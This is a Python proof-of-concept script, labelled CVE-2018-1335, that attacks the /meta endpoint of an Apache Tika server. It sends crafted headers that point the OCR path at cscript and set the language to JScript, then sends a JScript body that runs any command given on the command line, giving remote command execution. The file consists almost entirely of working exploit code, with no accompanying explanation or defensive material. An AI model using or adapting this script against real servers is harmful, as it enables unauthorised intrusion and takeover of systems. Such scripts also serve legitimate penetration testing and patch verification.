###############################
# CVE-2018-1335 PoC
###############################

import argparse
import requests

def exploit(args):
	if args.ssl:
		url = f"https://{args.host}:{args.port}/meta"
	else:
		url = f"http://{args.host}:{args.port}/meta"

	payload = f"""var shell = WScript.CreateObject("WScript.Shell"); 
	var exec = shell.Exec('cmd /c {args.command}');
	"""

	# Malacious Header
	headers = {
		"X-Tika-OCRTesseractPath" : "\"cscript\"", # For running cscript
		"X-Tika-OCRLanguage" : "//E:Jscript",
		"Expect": "100-continue", 
		"Content-type": "image/jp2", # Force Tika to not cehck magic bits
		"Connection": "close",
	}

	try:
		r = requests.put(url, headers=headers, data=payload, verify=False)
		print(r, r.text)
	except:
		print("Exploit failed")


def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('host', metavar='host', type=str, help='Host name or ip')
	parser.add_argument('port', metavar='port', type=int, help='Port number', default=80)
	parser.add_argument('command', metavar='command', type=str, help='Command to execute')
	parser.add_argument('--ssl', dest='ssl', action="store_true", help="If server uses ssl", default="")

	args = parser.parse_args()
	exploit(args)

if __name__=='__main__':
	main()